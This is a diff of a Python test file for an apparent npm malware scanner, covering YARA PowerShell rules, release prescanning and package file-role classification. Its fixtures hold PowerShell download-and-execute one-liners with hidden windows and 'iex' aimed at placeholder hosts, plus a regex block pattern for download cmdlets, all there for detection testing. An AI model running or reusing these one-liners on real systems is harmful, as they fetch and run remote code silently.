@@ -37,7 +37,7 @@ def test_yara_scans_binary_members_that_text_decoding_dropped(tmp_path, monkeypa
 
 
 def test_prescan_flags_hits_and_clears_clean_releases(tmp_path):
-    bad = _tgz({"package/package.json": b"{}", "package/x.ps1": b"powershell -c Invoke-WebRequest http://a/b.exe; Start-Process b.exe"})
+    bad = _tgz({"package/package.json": b"{}", "package/x.ps1": b"powershell -WindowStyle Hidden -c Invoke-WebRequest http://a/b.exe -OutFile b.exe; Start-Process b.exe"})
     good = _tgz({"package/package.json": b"{}", "package/index.js": b"module.exports = 1;"})
     blobs = {"https://registry.npmjs.org/bad/-/bad-1.0.0.tgz": bad, "https://registry.npmjs.org/good/-/good-1.0.0.tgz": good}
     fetcher = SafeFetcher(fetch=lambda url, _max: (200, {"content-type": "application/octet-stream"}, blobs[url]))
@@ -90,3 +90,32 @@ def test_ai_triage_round_trip_resolves_benign_and_escalates_suspicious(tmp_path)
     assert status == {"RAL-1": "resolved", "RAL-2": "open"}
     assert note["verdict"] == "suspicious"
     assert research_ai_triage.sync(core, db_path=db)["results"] == 0, "cursor prevents re-applying results"
+
+
+def test_powershell_rule_needs_staging_and_skips_documentation():
+    staging = b"exec('powershell -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadString(\\'http://x/p.ps1\\') | iex\"')"
+    instructions = b"Install: powershell -c \"Invoke-WebRequest https://x/i.ps1 | iex\" -WindowStyle Hidden"
+    guard = b"const blocked = /\\b(?:Invoke-WebRequest|irm)\\b/; // powershell -NoProfile | iex Start-Process"
+    hits = lambda path, data: [f for f in yara_engine.scan_files([(path, data)])["findings"] if "PowerShell_Download" in f["rule_id"]]
+    found = hits("package/install.js", staging)
+    assert found and {"$ps", "$ex2", "$ev1"} <= set(found[0]["matched_patterns"])
+    assert "[...]" not in found[0]["safe_context"] or found[0]["safe_context"].count("[...]") <= 2
+    assert not hits("package/README.md", instructions)
+    assert not hits("package/lib/guard.js", guard)
+
+
+def test_manifest_summary_and_file_roles():
+    manifest = research_funnel.manifest_summary([
+        ("package/package.json", json.dumps({"name": "x", "main": "lib/index.js", "bin": {"x": "./bin/x.js"},
+                                              "scripts": {"postinstall": "node setup.js", "test": "jest"}}).encode()),
+        ("package/setup.js", b""),
+    ])
+    assert manifest["install_scripts"] == {"postinstall": "node setup.js"} and manifest["other_scripts"] == ["test"]
+    role = lambda path: research_funnel.file_role(path, manifest)
+    assert role("package/setup.js") == "install_script"
+    assert role("package/bin/x.js") == "entry_point"
+    assert role("package/lib/index.js") == "entry_point"
+    assert role("package/README.md") == "documentation"
+    assert role("package/dist/app.js.map") == "source_map"
+    assert role("package/lib/util.js") == "code"
+    assert research_funnel.manifest_summary([("package/package.json", b"{bad")]) == {"parse_error": True}
